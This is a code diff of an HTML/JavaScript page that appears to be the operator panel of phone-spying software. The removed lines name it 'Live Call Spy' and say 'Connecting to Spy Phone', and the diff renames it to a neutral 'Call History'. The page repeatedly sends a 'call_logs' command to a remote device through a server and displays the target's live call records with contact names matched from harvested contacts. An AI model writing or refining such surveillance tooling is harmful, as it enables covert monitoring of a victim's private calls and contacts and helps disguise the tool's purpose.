@@ -3,143 +3,122 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Call Spy</title>
+    <title>Call History</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #000000;
-            --glass-bg: rgba(28, 28, 30, 0.6);
-            --glass-border: rgba(255, 255, 255, 0.15);
+            --glass-bg: #1c1c1e;
+            --border-color: #2c2c2e;
             --text-main: #ffffff;
             --text-sub: #8e8e93;
-            --incoming: #30d158;
-            --outgoing: #0a84ff;
-            --missed: #ff453a;
+            --incoming: #30d158; /* Green */
+            --outgoing: #0a84ff; /* Blue */
+            --missed: #ff453a;   /* Red */
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(135deg, #000000 0%, #1c1c1e 100%);
             color: var(--text-main);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            margin: 0; padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            margin: 0; padding: 10px;
             display: flex; justify-content: center;
         }
 
         .container {
-            width: 100%; max-width: 480px;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 40px; padding: 20px;
-            min-height: 85vh;
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
+            width: 100%; max-width: 500px;
+            background: #000;
+            min-height: 100vh;
         }
 
+        /* --- Header --- */
         .header {
+            position: sticky; top: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 100;
+            padding: 15px 10px;
+            border-bottom: 1px solid var(--border-color);
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 10px; padding: 0 10px 15px 10px;
-            border-bottom: 0.5px solid var(--glass-border);
         }
 
         .header-left { display: flex; align-items: center; gap: 10px; }
 
         .back-btn {
-            color: var(--text-main); font-size: 1.1rem;
-            text-decoration: none; width: 35px; height: 35px;
-            display: flex; align-items: center; justify-content: center;
+            color: #0a84ff; font-size: 1.1rem; text-decoration: none;
+            display: flex; align-items: center; gap: 5px;
         }
 
-        .page-title { 
-            font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px;
-        }
+        .page-title { font-size: 1.2rem; font-weight: 700; }
 
-        /* LIVE STATUS INDICATOR */
         .live-status {
             font-size: 0.75rem; color: var(--incoming);
             display: flex; align-items: center; gap: 6px;
-            background: rgba(48, 209, 88, 0.1);
-            padding: 4px 10px; border-radius: 20px;
+            background: rgba(48, 209, 88, 0.15);
+            padding: 5px 10px; border-radius: 20px;
+            font-weight: bold;
         }
 
         .live-dot {
             width: 8px; height: 8px; background-color: var(--incoming);
             border-radius: 50%;
-            box-shadow: 0 0 8px var(--incoming);
-            animation: pulse 1.5s infinite;
+            animation: blink 1.5s infinite;
         }
 
-        @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(1.1); }
-            100% { opacity: 1; transform: scale(1); }
-        }
+        @keyframes blink { 50% { opacity: 0.4; } }
 
         .refresh-btn {
-            background: transparent; border: none;
-            color: var(--text-main); font-size: 1.1rem; cursor: pointer;
+            background: none; border: none; color: var(--text-main);
+            font-size: 1.1rem; cursor: pointer;
         }
 
-        .log-list { 
-            display: flex; flex-direction: column; gap: 0px; 
-            max-height: 650px; overflow-y: auto; 
+        /* --- Log List --- */
+        .log-list {
+            display: flex; flex-direction: column;
+            padding-bottom: 20px;
         }
-        
-        .log-list::-webkit-scrollbar { width: 0px; background: transparent; }
 
         .log-card {
             padding: 12px 10px;
             display: flex; align-items: center;
-            border-bottom: 0.5px solid rgba(255,255,255,0.1);
-            transition: 0.2s;
-        }
-        
-        .log-card:active { background: rgba(255,255,255,0.1); }
-
-        .log-icon {
-            font-size: 0.9rem; margin-right: 15px; width: 30px; height: 30px;
-            display: flex; align-items: center; justify-content: center;
-            flex-shrink: 0;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.05);
-        }
-        
-        .log-icon.incoming { color: var(--text-main); }
-        .log-icon.outgoing { color: var(--text-main); }
-        .log-icon.missed { color: var(--missed); }
-
-        .log-info { flex: 1; overflow: hidden; display: flex; flex-direction: column; justify-content: center; }
-        
-        .log-name { 
-            font-size: 1.05rem; font-weight: 600; 
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-            color: var(--text-main);
-            display: flex; align-items: center; gap: 6px;
-        }
-        
-        .log-name.is-missed { color: var(--missed); }
-
-        .name-icon { font-size: 0.8rem; opacity: 0.7; }
-
-        .log-details-row {
-            display: flex; align-items: center; gap: 6px;
-            font-size: 0.8rem; color: var(--text-sub); margin-top: 3px;
+            border-bottom: 1px solid var(--border-color);
+            transition: background 0.2s;
         }
 
-        .call-action {
+        .log-card:active { background: #1c1c1e; }
+
+        .icon-box {
             width: 40px; height: 40px;
             display: flex; align-items: center; justify-content: center;
-            color: var(--outgoing);
-            font-size: 1.2rem;
-            text-decoration: none;
-            margin-left: 10px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 50%;
+            font-size: 1.1rem; margin-right: 15px;
         }
 
-        .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
+        .icon-box.incoming { color: var(--text-sub); } /* Standard iOS style usually greyish for regular calls */
+        .icon-box.outgoing { color: var(--text-sub); }
+        .icon-box.missed { color: var(--missed); }
+
+        .info-box { flex: 1; overflow: hidden; }
+
+        .name-row {
+            font-size: 1.05rem; font-weight: 600; color: #fff;
+            margin-bottom: 4px;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
         
-        /* Debug info hidden by default */
-        .debug-info { font-size: 10px; color: #555; text-align: center; margin-top: 5px; display: none; }
+        .name-row.is-missed { color: var(--missed); }
+
+        .details-row {
+            display: flex; align-items: center; gap: 6px;
+            font-size: 0.85rem; color: var(--text-sub);
+        }
+
+        .call-btn {
+            width: 35px; height: 35px;
+            display: flex; align-items: center; justify-content: center;
+            color: var(--outgoing); font-size: 1.2rem;
+            text-decoration: none; margin-left: 10px;
+        }
+
     </style>
 </head>
 <body>
@@ -147,21 +126,21 @@
     <div class="container">
         <div class="header">
             <div class="header-left">
-                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i> Back</a>
                 <span class="page-title">Recents</span>
             </div>
             
             <div class="live-status">
                 <div class="live-dot"></div>
-                <span id="liveText">LIVE</span>
+                <span>LIVE</span>
             </div>
-
-            <button onclick="manualRefresh()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
-        <div class="debug-info" id="debugBox"></div>
-        <div class="log-list" id="logsContainer">
+        <div id="logsContainer" class="log-list">
+            <div style="text-align: center; color: #666; margin-top: 50px;">
+                <i class="fa-solid fa-spinner fa-spin"></i> Loading...
             </div>
+        </div>
     </div>
 
     <script>
@@ -169,121 +148,53 @@
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         const storageKey = `calls_${DEVICE_ID}`;
+        
+        // Cache for Contacts (Names)
         let cachedContacts = [];
-        let refreshInterval;
 
         document.addEventListener("DOMContentLoaded", () => {
-            if (!DEVICE_ID) {
-                alert("ID Missing!");
-                window.location.href = "index.html";
-                return;
-            }
+            if (!DEVICE_ID) return alert("Device ID Missing");
             
-            detectContactsData();
-            loadFromStorage();
+            // 1. Try to load saved contacts from other pages
+            loadContactsCache();
             
-            // First fast command send
-            sendCommand();
-            
-            // Start Loop
-            startLiveUpdates();
+            // 2. Load old logs instantly
+            const savedData = localStorage.getItem(storageKey);
+            if (savedData) renderLogs(JSON.parse(savedData));
+
+            // 3. Start Live Updates
+            startLiveSystem();
         });
 
-        function startLiveUpdates() {
-            fetchLogs(); // Immediate fetch
-            // Update every 3 seconds
-            refreshInterval = setInterval(() => {
-                fetchLogs();
-            }, 3000);
-        }
-
-        function manualRefresh() {
-            document.getElementById("liveText").innerText = "Updating...";
-            fetchLogs();
-        }
-
-        // --- 1. SUPER CONTACT DETECTOR ---
-        function detectContactsData() {
-            try {
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key.toLowerCase().includes("contact")) {
-                        const rawData = localStorage.getItem(key);
-                        if (rawData) {
-                            const parsed = JSON.parse(rawData);
-                            if (Array.isArray(parsed) && parsed.length > 0) {
-                                cachedContacts = parsed;
-                                return;
-                            }
-                        }
-                    }
+        function loadContactsCache() {
+            // Hum localStorage check karenge agar wahan contacts saved hain
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.includes("contact")) {
+                    try {
+                        const data = JSON.parse(localStorage.getItem(key));
+                        if (Array.isArray(data)) cachedContacts = data;
+                    } catch(e) {}
                 }
-            } catch (e) { console.error("Contacts error", e); }
-        }
-
-        function findContactName(phoneNumber) {
-            if (!cachedContacts || cachedContacts.length === 0) return null;
-            try {
-                const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
-                const match = cachedContacts.find(c => {
-                    const contactPhone = c.phone || c.number || ""; // Handle both keys
-                    if(!contactPhone) return false;
-                    const cleanContactNum = contactPhone.toString().replace(/\D/g, '').slice(-10);
-                    return cleanContactNum === cleanLogNum;
-                });
-                return match ? (match.name || match.display_name) : null;
-            } catch (e) { return null; }
-        }
-
-        // --- 2. UNIVERSAL DATE FIXER (Ye "Unknown" hatayega) ---
-        function getValidDate(log) {
-            // Server kabhi 'date' bhejta hai, kabhi 'timestamp', kabhi 'time'
-            let raw = log.date || log.timestamp || log.time || log.created_at;
-
-            if (!raw) return null; // Date hi nahi hai
-
-            // Agar date string hai (e.g. "2024-01-01")
-            let dateObj = new Date(raw);
-            if (!isNaN(dateObj.getTime())) return dateObj;
-
-            // Agar date number hai (e.g. 1709876543)
-            let num = Number(raw);
-            if (!isNaN(num)) {
-                // Agar chota number hai (Seconds), to ms bana do
-                if (num < 1000000000000) num *= 1000;
-                return new Date(num);
-            }
-
-            return null; // Haar maan li
-        }
-
-        function formatSmartDate(dateObj) {
-            if (!dateObj) return "Unknown Date";
-
-            const now = new Date();
-            const yesterday = new Date(now);
-            yesterday.setDate(yesterday.getDate() - 1);
-
-            const timeStr = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-
-            if (dateObj.toDateString() === now.toDateString()) {
-                return `Today, ${timeStr}`;
-            } else if (dateObj.toDateString() === yesterday.toDateString()) {
-                return `Yesterday, ${timeStr}`;
-            } else {
-                return dateObj.toLocaleDateString() + ", " + timeStr;
             }
         }
 
-        // --- 3. SERVER LOGIC ---
-        function loadFromStorage() {
-            const savedData = localStorage.getItem(storageKey);
-            if (savedData) {
-                renderLogs(JSON.parse(savedData));
-            } else {
-                document.getElementById("logsContainer").innerHTML = `
-                    <div class="status-msg"><p>Connecting to Spy Phone...</p></div>`;
-            }
+        function getContactName(number) {
+            if (!cachedContacts.length || !number) return null;
+            const cleanLogNum = number.toString().replace(/\D/g, '').slice(-10);
+            
+            const match = cachedContacts.find(c => {
+                const cNum = (c.number || c.phone || "").toString().replace(/\D/g, '').slice(-10);
+                return cNum === cleanLogNum;
+            });
+            return match ? match.name : null;
+        }
+
+        function startLiveSystem() {
+            sendCommand();
+            fetchLogs();
+            setInterval(sendCommand, 10000); // Har 10 sec mein command
+            setInterval(fetchLogs, 4000);    // Har 4 sec mein data check
         }
 
         function sendCommand() {
@@ -291,93 +202,101 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: 'call_logs' })
-            });
+            }).catch(() => {});
         }
 
         function fetchLogs() {
-            const timestamp = new Date().getTime();
-            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${timestamp}`)
-                .then(response => response.json())
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${Date.now()}`)
+                .then(res => res.json())
                 .then(data => {
-                    // Update header time to show it's LIVE
-                    const timeNow = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
-                    document.getElementById("liveText").innerText = `LIVE (${timeNow})`;
-
-                    if (data && Array.isArray(data) && data.length > 0) {
+                    if (data && data.length > 0) {
                         localStorage.setItem(storageKey, JSON.stringify(data));
-                        detectContactsData();
                         renderLogs(data);
                     }
                 })
-                .catch(err => {
-                    console.log("Live check...");
-                    document.getElementById("liveText").innerText = "Connecting...";
-                });
+                .catch(e => console.log("Waiting for connection..."));
+        }
+
+        // --- DATE FORMATTER (12 Hour Fix) ---
+        function formatTime(timestamp) {
+            if (!timestamp) return "";
+            
+            // Fix timestamp format (seconds vs ms)
+            let dateObj;
+            if (String(timestamp).length === 10) dateObj = new Date(timestamp * 1000);
+            else dateObj = new Date(timestamp);
+
+            if (isNaN(dateObj.getTime())) return "";
+
+            // 12 Hour Format (e.g. 10:30 PM)
+            const timeStr = dateObj.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
+            
+            // Check if Today/Yesterday
+            const now = new Date();
+            const yesterday = new Date(now);
+            yesterday.setDate(yesterday.getDate() - 1);
+
+            if (dateObj.toDateString() === now.toDateString()) {
+                return timeStr; // Aaj hai toh sirf time
+            } else if (dateObj.toDateString() === yesterday.toDateString()) {
+                return `Yesterday`;
+            } else {
+                return dateObj.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
+            }
         }
 
         function renderLogs(data) {
             const container = document.getElementById("logsContainer");
-            if(!container) return;
+            if (!data.length) {
+                container.innerHTML = '<div style="text-align: center; color: #666; margin-top: 50px;">No logs found.</div>';
+                return;
+            }
 
-            // Pre-process dates for sorting
-            data.forEach(log => {
-                log._validDate = getValidDate(log);
-                log._sortTime = log._validDate ? log._validDate.getTime() : 0;
-            });
-
-            // Sort: Latest call first
-            data.sort((a, b) => b._sortTime - a._sortTime);
+            // Sort: Newest first
+            data.sort((a, b) => (b.date || b.timestamp || 0) - (a.date || a.timestamp || 0));
 
             let html = "";
-            
             data.forEach(log => {
                 const type = (log.type || "").toLowerCase();
                 let iconClass = "incoming";
-                let iconSymbol = "fa-arrow-down";
+                let icon = "fa-phone-arrow-down-left"; // Incoming
                 let isMissed = false;
+                let typeText = "Incoming";
 
-                if(type.includes("outgoing")) {
-                    iconClass = "outgoing"; iconSymbol = "fa-arrow-up";
-                } else if(type.includes("missed") || type.includes("rejected")) {
-                    iconClass = "missed"; iconSymbol = "fa-xmark"; isMissed = true;
+                if (type.includes("outgoing")) {
+                    iconClass = "outgoing";
+                    icon = "fa-phone-arrow-up-right";
+                    typeText = "Outgoing";
+                } else if (type.includes("missed") || type.includes("rejected")) {
+                    iconClass = "missed";
+                    icon = "fa-phone-slash";
+                    isMissed = true;
+                    typeText = "Missed";
                 }
 
-                const matchedName = findContactName(log.number);
-                const nameColorClass = isMissed ? "is-missed" : "";
-
-                // Name logic
-                let mainText = matchedName ? matchedName : log.number;
-                let subText = matchedName ? `Mobile • ${log.number}` : "Unsaved Number";
-                
-                // Icon Logic
-                let mainIcon = matchedName 
-                    ? `<i class="fa-solid fa-user name-icon"></i>` 
-                    : `<i class="fa-solid fa-mobile-screen name-icon"></i>`;
-
-                // Date Logic (Finally fixed)
-                const prettyDate = formatSmartDate(log._validDate);
+                const savedName = getContactName(log.number);
+                const displayName = savedName || log.number;
+                const displaySub = savedName ? `${typeText} • ${log.number}` : typeText;
+                const timeString = formatTime(log.date || log.timestamp || log.time);
 
                 html += `
                     <div class="log-card">
-                        <div class="log-icon ${iconClass}">
-                            <i class="fa-solid ${iconSymbol}"></i>
+                        <div class="icon-box ${iconClass}">
+                            <i class="fa-solid ${icon}"></i>
                         </div>
-                        <div class="log-info">
-                            <div class="log-name ${nameColorClass}">
-                                ${mainIcon} &nbsp; ${mainText}
-                            </div>
-                            <div class="log-details-row">
-                                <span>${subText}</span>
-                                <span>&nbsp;•&nbsp;</span>
-                                <span>${prettyDate}</span>
+                        <div class="info-box">
+                            <div class="name-row ${isMissed ? 'is-missed' : ''}">${displayName}</div>
+                            <div class="details-row">
+                                <i class="fa-solid fa-clock" style="font-size: 0.7rem;"></i>
+                                ${displaySub} &nbsp;•&nbsp; ${timeString}
                             </div>
                         </div>
-                        <a href="tel:${log.number}" class="call-action">
-                            <i class="fa-solid fa-phone"></i>
+                        <a href="tel:${log.number}" class="call-btn">
+                            <i class="fa-regular fa-circle-play"></i>
                         </a>
-                    </div>`;
+                    </div>
+                `;
             });
-
             container.innerHTML = html;
         }
     </script>
